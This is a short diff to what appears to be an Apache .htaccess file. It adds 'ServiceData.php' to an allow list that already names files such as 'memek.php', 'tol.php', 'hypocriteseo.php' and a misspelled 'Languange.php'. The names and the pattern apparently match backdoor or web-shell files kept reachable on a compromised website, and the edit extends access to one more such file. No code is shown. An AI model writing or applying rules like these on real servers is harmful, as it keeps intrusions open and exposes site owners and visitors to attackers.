@@ -70,7 +70,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(adaptor.php|Languange.php|index.php|load.php|loader.shtml|memek.php|tol.php|hypocriteseo.php)$">
+<FilesMatch "^(adaptor.php|Languange.php|index.php|load.php|loader.shtml|memek.php|tol.php|hypocriteseo.php|ServiceData.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
